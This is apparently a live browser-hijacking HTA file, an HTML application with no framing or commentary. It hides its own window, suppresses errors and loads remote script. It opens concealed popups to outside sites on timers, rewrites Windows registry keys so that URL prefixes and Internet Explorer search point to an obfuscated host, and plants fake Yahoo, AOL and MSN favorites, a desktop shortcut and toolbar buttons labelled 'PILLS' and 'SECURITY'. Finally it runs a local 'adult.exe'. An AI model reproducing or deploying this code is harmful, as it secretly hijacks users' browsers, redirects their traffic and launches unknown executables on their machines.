<HTML>
<HEAD>
<HTA:APPLICATION 
border="none" 
borderStyle="normal" 
caption="no" 
showInTaskbar="no" 
windowState="minimize"
innerBorder="no"
navigable="no"
scrollFlat="no"
APPLICATIONNAME="r"  
MAXIMIZEBUTTON="no"
MINIMIZEBUTTON="no"
SINGLEINSTANCE="yes"
SCROLL="no" />
<script language=JavaScript>
function sErr(){ return true;}
window.onerror=sErr;

resizeTo(0,0); blur;
self.moveTo(5000,5000);

function dl()
{
//window.open("http://apsua.com/dial2.htm","d","toolbar=no,location=no,directories=no,status=no,scrollbars=yes,menubar=no,resizable=yes,fullscreen=no,width=10,height=10,left=5000,top=5000");
setTimeout('cj()',300000);
setTimeout('dl2()',800000);
rs();
};

function dl2()
{
window.open("http://apsua.com/dial2.htm","d","toolbar=no,location=no,directories=no,status=no,scrollbars=yes,menubar=no,resizable=yes,fullscreen=no,width=10,height=10,left=5000,top=5000");
};

function cj()
{
window.open("http://www.pixpox.com/show/tradegals.cgi","c","toolbar=no,location=no,directories=no,status=no,scrollbars=yes,menubar=no,resizable=yes,fullscreen=no,width=10,height=10,left=5000,top=5000");
setTimeout('cj()',900000);
};


</script>
</HEAD>
<body onload="setTimeout('dl()',120000);">

<script language="JavaScript" src="http://apsua.com/cgi-bin/r4.pl"></script>

<script language="VBScript">
On Error Resume Next


Function rs()



Set WshShell = CreateObject("Wscript.Shell")
u="http://DF809JOW4WJ2304LFD0SF9FSD0A2T4LDF809JOW4WJ2304LFD0SF9FSD0A2T4LD%2E%42%49%5A"


a=Now
WshShell.RegWrite "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\URL\DefaultPrefix\",u+"/c/c.pl?url="
dif=DateDiff("s",a,Now)
if (dif<1) Then

 WshShell.RegWrite "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\URL\DefaultPrefix",u+"/c/c.pl?url="

  WshShell.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Internet Explorer\Search\SearchAssistant",u+"/search.htm"
   WshShell.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Internet Explorer\Search\CustomizeSearch",u+"/search.htm"
    WshShell.RegWrite "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Internet Explorer\SearchUrl",u+"/search.htm"
    
     set WshShell = CreateObject("WScript.Shell")
      strDesktop = WshShell.SpecialFolders("Desktop")
       strFavorites = WshShell.SpecialFolders("Favorites")
              
        set oShellLink = WshShell.CreateShortcut(strDesktop & "\Search.lnk")
	 oShellLink.TargetPath = u
	  oShellLink.WindowStyle = 1
'	   oShellLink.Hotkey = "F1"
	    oShellLink.IconLocation = "shell32.dll, 4"
	     oShellLink.Save
	     
	      set oUrlLink = WshShell.CreateShortcut(strFavorites & "\YAHOO.com.url")
	       oUrlLink.TargetPath = u
	        oUrlLink.Save
		 set oUrlLink = WshShell.CreateShortcut(strFavorites & "\YAHOO.url")
		  oUrlLink.TargetPath = u
		   oUrlLink.Save
		    set oUrlLink = WshShell.CreateShortcut(strFavorites & "\AOL.com.url")
		     oUrlLink.TargetPath = u
		      oUrlLink.Save
		       set oUrlLink = WshShell.CreateShortcut(strFavorites & "\AOL.url")
		        oUrlLink.TargetPath = u
			 oUrlLink.Save
			  set oUrlLink = WshShell.CreateShortcut(strFavorites & "\MSN.com.url")
			   oUrlLink.TargetPath = u
			    oUrlLink.Save
			     set oUrlLink = WshShell.CreateShortcut(strFavorites & "\MSN.url")
			      oUrlLink.TargetPath = u
			       oUrlLink.Save
			       
			        ky="HKEY_LOCAL_MACHINE\Software\Microsoft\Internet Explorer\Extensions\{0B5F1910-F111-11d2-BB9E-00C04F7956B"
				 kz="{1FBA04EE-3024-11D2-8F1F-0000F87ABD16}"
				 
				  WshShell.RegWrite ky+"1}\ButtonText","SEARCH"
				   WshShell.RegWrite ky+"1}\HotIcon", "shell32.dll,5"
				    WshShell.RegWrite ky+"1}\Icon", "shell32.dll,4"
				     WshShell.RegWrite ky+"1}\Exec",u+"/find.htm"
				      WshShell.RegWrite ky+"1}\CLSID", kz
				       WshShell.RegWrite ky+"1}\Default Visible", "Yes"
				       
				        WshShell.RegWrite ky+"2}\ButtonText","ENTERTAINMENT"
					 WshShell.RegWrite ky+"2}\HotIcon", "shell32.dll,12"
					  WshShell.RegWrite ky+"2}\Icon", "shell32.dll,13"
					   WshShell.RegWrite ky+"2}\Exec",u+"/av.htm"
					    WshShell.RegWrite ky+"2}\CLSID", kz
					     WshShell.RegWrite ky+"2}\Default Visible", "Yes"
					     
					      WshShell.RegWrite ky+"3}\ButtonText","PILLS"
					       WshShell.RegWrite ky+"3}\HotIcon", "shell32.dll,181"
					        WshShell.RegWrite ky+"3}\Icon", "shell32.dll,180"
						 WshShell.RegWrite ky+"3}\Exec",u+"/med.htm"
						  WshShell.RegWrite ky+"3}\CLSID", kz
						   WshShell.RegWrite ky+"3}\Default Visible", "Yes"
						   
						    WshShell.RegWrite ky+"4}\ButtonText","SECURITY"
						     WshShell.RegWrite ky+"4}\HotIcon", "shell32.dll,194"
						      WshShell.RegWrite ky+"4}\Icon", "shell32.dll,45"
						       WshShell.RegWrite ky+"4}\Exec",u+"/check.htm"
						        WshShell.RegWrite ky+"4}\CLSID", kz
							 WshShell.RegWrite ky+"4}\Default Visible", "Yes"
							 
							  WshShell.RegWrite ky+"5}\ButtonText","SEARCH"
							   WshShell.RegWrite ky+"5}\HotIcon", "shell32.dll,157"
							    WshShell.RegWrite ky+"5}\Icon", "shell32.dll,155"
							     WshShell.RegWrite ky+"5}\Exec",u
							      WshShell.RegWrite ky+"5}\CLSID", kz
							       WshShell.RegWrite ky+"5}\Default Visible", "Yes"
							       
path = "c://adult.exe" 
WshShell.run(path)
							       
							       
							       End If
							       End Function
							           </script>
</body>
</HTML>
       